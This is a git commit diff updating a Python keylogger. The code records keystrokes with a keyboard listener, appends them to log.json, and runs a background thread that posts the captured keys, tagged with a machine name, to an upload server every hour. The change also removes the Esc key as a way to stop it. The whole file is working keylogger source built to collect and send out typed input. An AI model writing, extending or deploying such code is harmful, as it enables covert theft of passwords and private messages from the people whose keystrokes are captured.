3c11df10cdcc11649263f9bf887b32e3055c0b8b
Yehuda Freiman <yehfre@icloud.com>
2025-09-01 11:24:29 +0300

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -26,32 +26,48 @@ class KeyLoggerService:
     def get_logs(self):
         return self.all_logs
 
+    def clear_logs(self):
+        self.all_logs = []
+
 class FileWriter:
     @staticmethod
-    def write_to_file(key_data):
-        with open("log.json", 'a') as log_file:
-            json.dump(key_data, log_file, indent=2, ensure_ascii=False)
+    def write_to_file(logs, machine_name="windows"):
+        new_task = {
+            "machine": machine_name,
+            "data": logs
+        }
+        with open("log.json", "a", encoding="utf-8") as log_file:
+            json.dump(new_task, log_file, indent=2, ensure_ascii=False)
             log_file.write("\n")
 
 class ServerSender:
-    def __init__(self, server_url, service):
+    def __init__(self, server_url, service, machine_name="Mac"):
         self.server_url = server_url
         self.service = service
+        self.machine_name = machine_name
         threading.Thread(target=self.send_to_server, daemon=True).start()
 
     def send_to_server(self):
         while True:
             logs = self.service.get_logs()
             if logs:
-                response = requests.post(self.server_url, json=logs)
-                print(f"Data sent to server. Response: {response.text}")
-            time.sleep(5)
+                new_task = {
+                    "machine": self.machine_name,
+                    "data": logs
+                }
+                try:
+                    response = requests.post(self.server_url, json=new_task)
+                    print(f"Data sent to server. Response: {response.text}")
+                    self.service.clear_logs()
+                except requests.exceptions.RequestException as e:
+                    print(f"Error sending data: {e}")
+            time.sleep(3600)
 
 class KeyLoggerManager:
     def __init__(self):
         self.service = KeyLoggerService()
         self.file_writer = FileWriter()
-        self.server_sender = ServerSender("http://127.0.0.1:5000/api/upload", self.service)
+        self.server_sender = ServerSender("http://127.0.0.1:5001/api/upload", self.service)
         self.listener = None
 
     def handle_key_press(self, key):
@@ -59,10 +75,7 @@ class KeyLoggerManager:
         if key == Key.space:
             logs = self.service.save_and_clear()
             self.file_writer.write_to_file(logs)
-        elif key == Key.esc:
-            logs = self.service.save_and_clear()
-            self.file_writer.write_to_file(logs)
-            return False
+        
 
     def start(self):
         with keyboard.Listener(on_release=self.handle_key_press) as listener:
